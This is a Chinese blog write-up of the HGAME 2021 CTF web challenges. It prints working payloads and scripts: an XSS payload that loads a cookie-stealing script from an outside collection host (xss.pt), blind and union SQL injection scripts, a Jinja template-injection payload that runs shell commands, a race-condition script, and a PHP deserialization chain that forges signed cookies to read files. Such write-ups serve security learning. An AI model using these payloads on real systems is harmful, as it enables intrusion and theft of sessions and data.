title: HGAME 2021web部分题解
author: bmth
tags:
  - HGAME2021
  - CTF
categories: []
img: 'https://img-blog.csdnimg.cn/20210304210543934.png'
date: 2021-03-04 20:56:00
---
## 第一周
### Hitchhiking_in_the_Galaxy
送分题，没啥好说的，改POST，User-Agent，Referer和X-Forwarded-For即可得到flag
![](https://img-blog.csdnimg.cn/20210131133231395.png)
### watermelon
在`src/project.js`里发现源码，查找alert，很明显的信息弹窗输出和判断分数的if，base64解密得到flag
![](https://img-blog.csdnimg.cn/20210131133455719.png)
### 宝藏走私者(走私者的愤怒)
考的是CVE-2018-8004，可参考文章：[协议层的攻击——HTTP请求走私 ](https://www.anquanke.com/post/id/188293)
需要构造走私，注意在请求包中加入`Transfer-Encoding: chunked`
![](https://img-blog.csdnimg.cn/20210131133856720.png)发现请求走私成功，那么直接按要求加入即可(一次不成功多试几次)
![](https://img-blog.csdnimg.cn/20210131134032265.png)需要注意的一点是在这里，不需要我们对其他用户造成影响，因此走私过去的请求也必须是一个完整的请求，最后的两个rn不能丢弃。(这题我是用的一个rn)
![](https://img-blog.csdnimg.cn/20210202160425396.png)
### 智商检测鸡
本题应该考察的是写脚本的能力，直接使用无敌的python，并且学习了一下sympy库和requests库，还行，使用requests.session就可以了
```python
#conding=utf-8
from sympy import *
import requests
import json
import re

s = requests.session()
for i in range(100):
    a = s.get("http://r4u.top:5000/api/getQuestion")
    b = a.text

    res1 = r'<mo>(.*?)</mo>'
    m1 =  re.findall(res1,b,re.S|re.M)
    res2 = r'<mn>(.*?)</mn>'
    m2 =  re.findall(res2,b,re.S|re.M)
    x = symbols('x')
    answer = integrate(m2[2]+'*'+'x'+'+'+m2[3], (x, '-'+m2[0], m2[1]))
    print(float(answer))

    dic = {'answer': float(answer)}

    r = s.post("http://r4u.top:5000/api/verify",json=dic)
    back = s.get("http://r4u.top:5000/api/getStatus")
    print(back.text)

result = s.get("http://r4u.top:5000/api/getFlag")
print(result.text)
```
![](https://img-blog.csdnimg.cn/20210131215538243.png)
## 第二周
这周做了比较久，一是没啥思路，二是快过年了，回老家之后没啥时间

### LazyDogR4U 
一开始毫无思路，最后用dirsearch扫描目录，被封ip了，过了几天尝试`www.zip`得到了源码，好家伙
![](https://img-blog.csdnimg.cn/20210210183742508.png)
随后分析得到的源码，发现判断登录是判断的md5值，使用的是`==`，弱比较，又因为config.ini：
```
[global]
debug = true

[admin]
username = admin
pass_md5 = b02d455009d3cf71951ba28058b2e615

[testuser]
username = testuser
pass_md5 = 0e114902927253523756713132279690
```
发现testuser的密码为0e开头，后面是一串数字，那么传入md5加密后为0e开头的即可，我这里使用的是`QNKCDZO`，成功登录
![](https://img-blog.csdnimg.cn/20210210184514307.png)
开始审计代码，很明显的变量覆盖，判断的是如果存在`$filter = ["SESSION", "SEVER", "COOKIE", "GLOBALS"];`，就置为空
```php
$filter = ["SESSION", "SEVER", "COOKIE", "GLOBALS"];

// 直接注册所有变量，这样我就能少打字力，芜湖~

foreach(array('_GET','_POST') as $_request){
    foreach ($$_request as $_k => $_v){
        foreach ($filter as $youBadBad){
            $_k = str_replace($youBadBad, '', $_k);
        }
        ${$_k} = $_v;
    }
}
```
得到flag的条件是：`if($_SESSION['username'] === 'admin')`
直接双写绕过，GET传入`?_SESSESSIONSION[username]=admin`，然后POST传入`submit=getflag`即可得到flag
![](https://img-blog.csdnimg.cn/20210210184333586.png)
### Post to zuckonit
![](https://img-blog.csdnimg.cn/2021020921232934.png)
存在Post和Submit，肯定是xss，那么直接利用网上的xss平台：[https://xss.pt](https://xss.pt)，尝试了一下，发现script会被过滤，那么使用img试了一下，发现所有代码反过来了，那么反着提交一遍试一下，发现成功，这里使用的是
```
// 通杀火狐谷歌360
<img src=x onerror=eval(atob('cz1jcmVhdGVFbGVtZW50KCdzY3JpcHQnKTtib2R5LmFwcGVuZENoaWxkKHMpO3Muc3JjPSdodHRwczovL3hzcy5wdC9VSFVSPycrTWF0aC5yYW5kb20oKQ=='))>
```
![](https://img-blog.csdnimg.cn/20210209213127125.png)
使用了比较弱智的MD5脚本：
```python
import hashlib
dict1 = "abcdefghijklmnopqrstuvwxyz0123456789ABCDEFGHIJKLMNOPQRSTUVWXZY"

for i in dict1:
    for j in dict1:
        for k in dict1:
            for m in dict1:
                for n in dict1:
                    str1 = i+j+k+m+n
                    if(hashlib.md5(str1.encode("UTF-8")).hexdigest().startswith("546cea")):
                        print(str1)
```
但传了几个都发现没效，偶然间发现传回来了token，搞不懂是哪个代码执行成功了，忘了，试了好多的代码
![](https://img-blog.csdnimg.cn/20210209220231319.png)
更改token得到flag
![](https://img-blog.csdnimg.cn/20210209213604497.png)
看wp发现`http ptth tpircs`都被过滤了，那么其实可以双写绕过：`ptptthth`或者直接用`//`代替`http://`，payload：`>")eikooc.tnemucod+'/pi-spv//'(nepo.wodniw"=rorreno 'x'=crs gmi<on`
### 200OK!!
**hint: status 字段会有什么坏心思呢?**
**hint: 这些字符串存在哪里呢？变量？还是...？**
题目给了两个提示，才突然明白应该是sql注入呀，存放在数据库中！！！
通过`1'#`来判断是否被过滤
![](https://img-blog.csdnimg.cn/20210211154458560.png)
测试发现过滤了空格，使用`/**/`，过滤select，from，where，使用大小写绕过
![](https://img-blog.csdnimg.cn/2021021115441022.png)
直接写脚本就可以了
```python
import requests

flag=''
url = "https://200ok.liki.link/server.php/"
for n in range(1,50):
    for i in range(32,127):
        payload="'/**/or/**/if(ascii(substr((seLEct/**/ffffff14gggggg/**/fRom/**/f1111111144444444444g),%d,1))=%d,0,3)#"  %(n,i)
        #print(payload)
        headers={
        'Status':'2'+payload
        }  
        r = requests.get(url,headers=headers)
        if '400' in r.text:
            flag = flag+chr(i)
            print(flag)
            break
    if '}' in flag:
        break
print(flag)
```
![](https://img-blog.csdnimg.cn/20210211170239801.png)看wp发现这题可以直接联合注入就出来的。。。。。
```sql
-1'/**/uniOn/**/seLect/**/ffffff14gggggg/**/fRom/**/f1111111144444444444g;#
```
![](https://img-blog.csdnimg.cn/20210304205349522.png)
## 第三周
### Forgetful
题目已经说了是**Python 写了一个 TodoList**，那么考虑ssti模板注入，首先随便注册一个账号，发送我们的测试代码
![](https://img-blog.csdnimg.cn/20210214134956272.png)点击查看发现变为了4，存在漏洞
![](https://img-blog.csdnimg.cn/20210214135025277.png)
直接发送payload：
```python
{% for c in [].__class__.__base__.__subclasses__() %}{% if c.__name__=='catch_warnings' %}{{ c.__init__.__globals__['__builtins__'].eval("__import__('os').popen('id').read()") }}{% endif %}{% endfor %}
{% for c in [].__class__.__base__.__subclasses__() %}{% if c.__name__=='catch_warnings' %}{{ c.__init__.__globals__['__builtins__'].eval("__import__('os').popen('cat /flag|base64').read()") }}{% endif %}{% endfor %}
```
![](https://img-blog.csdnimg.cn/2021021413511126.png)
`cat /flag`发现被过滤了，那么使用base64编码一下即可
![](https://img-blog.csdnimg.cn/20210214135222751.png)
base64解码得到flag

## 没做出来的题目复现
### Liki的生日礼物
看wp发现考点为条件竞争，使用python多线程即可
```python
import threading
import requests
import json
import time

host = "https://birthday.liki.link/API/"

user = {
"name": "12a",
"password": "12a"
}

s = requests.session()

s.post(url="{}?m=login".format(host), data=user)

def post():
    data = {
    "amount": "1"
    }
    url = "{}?m=buy".format(host)
    try:
        s.post(url=url, data=data)
    except:
        print("Failed")
    return

while True:
    info = json.loads(s.get("{}?m=getinfo".format(host)).text)
    money = info['data']['money']
    num = info['data']['num']
    print(money)
    print(num)

    if num >= 52:
        print(s.get("{}?m=getflag".format(host)).text)
        break

    for i in range(21):
        t = threading.Thread(target=post)
        t.start()

    time.sleep(5)
```
![](https://img-blog.csdnimg.cn/20210223131318721.png)
### Liki-Jail
发现要是被过滤就会显示`Invalid username`
![](https://img-blog.csdnimg.cn/20210223124847442.png)
发现过滤了`' " = union and & | (空格) `
测试发现是sql盲注，由于过滤了`'`，使用`\`转义即可
![](https://img-blog.csdnimg.cn/20210223125151963.png)
```python
import requests
import time

url = 'https://jailbreak.liki.link/login.php'
flag = ''
for n in range(1,40):
    for i in range(32,126):
        #payload = 'or/**/if(ascii(substr((select/**/group_concat(table_name)/**/from/**/information_schema.tables/**/where/**/table_schema/**/regexp/**/database()),%d,1))regexp/**/%d,sleep(3),1)#' %(n,i)
        #payload = 'or/**/if(ascii(substr((select/**/group_concat(column_name)/**/from/**/information_schema.columns/**/where/**/table_name/**/regexp/**/0x7535657273),%d,1))regexp/**/%d,sleep(3),1)#' %(n,i)
        payload = 'or/**/if(ascii(substr((select/**/group_concat(`usern@me`,0x2c,`p@ssword`)/**/from/**/u5ers),%d,1))regexp/**/%d,sleep(3),1)#' %(n,i)
        print(payload)
        data={
            'username':'admin@qq.com\\',
            'password':payload
            }
        start = int(time.time())
        r = requests.post(url,data=data)
        end = int(time.time()) - start
        if end>=3:
            flag = flag+chr(i)
            break
    if flag == '':
        break
    print(flag)
```
直接使用脚本即可得到账号密码
![](https://img-blog.csdnimg.cn/20210223125328239.png)
**这里本来做的差不多了，结果最后一步爆不出来账号密码，发现原来要加上反引号，在mysql中用来区分保留字符与普通字符**

### Arknights
很明显的提示，需要使用GitHack来，即可得到源码
![](https://img-blog.csdnimg.cn/20210302151016820.png)
simulator.php：
```php
<?php

class Simulator{

    public $session;
    public $cardsPool;

    public function __construct(){

        $this->session = new Session();
        if(array_key_exists("session", $_COOKIE)){
            $this->session->extract($_COOKIE["session"]);
        }

        $this->cardsPool = new CardsPool("./pool.php");
        $this->cardsPool->init();
    }

    public function draw($count){
        $result = array();

        for($i=0; $i<$count; $i++){
            $card = $this->cardsPool->draw();

            if($card["stars"] == 6){
                $this->session->set('', $card["No"]);
            }

            $result[] = $card;
        }

        $this->session->save();

        return $result;
    }

    public function getLegendary(){
        $six = array();

        $data = $this->session->getAll();
        foreach ($data as $item) {
            $six[] = $this->cardsPool->cards[6][$item];
        }

        return $six;
    }
}

class CardsPool
{

    public $cards;
    private $file;

    public function __construct($filePath)
    {
        if (file_exists($filePath)) {
            $this->file = $filePath;
        } else {
            die("Cards pool file doesn't exist!");
        }
    }

    public function draw()
    {
        $rand = mt_rand(1, 100);
        $level = 0;

        if ($rand >= 1 && $rand <= 42) {
            $level = 3;
        } elseif ($rand >= 43 && $rand <= 90) {
            $level = 4;
        } elseif ($rand >= 91 && $rand <= 99) {
            $level = 5;
        } elseif ($rand == 100) {
            $level = 6;
        }

        $rand_key = array_rand($this->cards[$level]);

        return array(
            "stars" => $level,
            "No" => $rand_key,
            "card" => $this->cards[$level][$rand_key]
        );
    }

    public function init()
    {
        $this->cards = include($this->file);
    }

    public function __toString(){
        return file_get_contents($this->file);
    }
}


class Session{

    private $sessionData;

    const SECRET_KEY = "7tH1PKviC9ncELTA1fPysf6NYq7z7IA9";

    public function __construct(){}

    public function set($key, $value){
        if(empty($key)){
            $this->sessionData[] = $value;
        }else{
            $this->sessionData[$key] = $value;
        }
    }

    public function getAll(){
        return $this->sessionData;
    }


    public function save(){

        $serialized = serialize($this->sessionData);
        $sign = base64_encode(md5($serialized . self::SECRET_KEY));
        $value = base64_encode($serialized) . "." . $sign;

        setcookie("session",$value);
    }


    public function extract($session){

        $sess_array = explode(".", $session);
        $data = base64_decode($sess_array[0]);
        $sign = base64_decode($sess_array[1]);

        if($sign === md5($data . self::SECRET_KEY)){
            $this->sessionData = unserialize($data);
        }else{
            unset($this->sessionData);
            die("Go away! You hacker!");
        }
    }
}


class Eeeeeeevallllllll{
    public $msg="坏坏liki到此一游";

    public function __destruct()
    {
        echo $this->msg;
    }
}
```
>能够发现抽卡数据存放在`Session`类中的`sessionData`，`sessionData`被序列化后保存在客戶端cookie中并签名，当发回服务端后会使用`SECRET_KEY`验证。但是有了源码我们就能够伪造`cookie`并控制`unserialize()`函数的参数
于是就找到类反序列化的点，现在只需要构造反序列化链来完成攻击。可以⽤ `Eeeeeeevallllllll` 类的 `__desctruct()` 魔术⽅法来触发 `CardsPool` 的 `__toString()` ⽅法

POC:
```php
<?php
class Eeeeeeevallllllll{
	public $msg="坏坏liki到此⼀游";
	public function __destruct()
	{
		echo $this->msg;
	}
}

class CardsPool
{
	private $file;
	public function __construct($file)
	{
		$this->file=$file;
	}
	
	public function __toString(){
		return file_get_contents($this->file);
	}
}

$eval = new Eeeeeeevallllllll();
$cards = new CardsPool("./flag.php");
$eval->msg = $cards;

const SECRET_KEY = "7tH1PKviC9ncELTA1fPysf6NYq7z7IA9";

$serialized = serialize($eval);
$sign = base64_encode(md5($serialized . SECRET_KEY));
$value = base64_encode($serialized) . "." . $sign;
echo $value;
```
![](https://img-blog.csdnimg.cn/20210304103742912.png)
然后抓包修改cookie即可得到flag
![](https://img-blog.csdnimg.cn/20210304103634110.png)

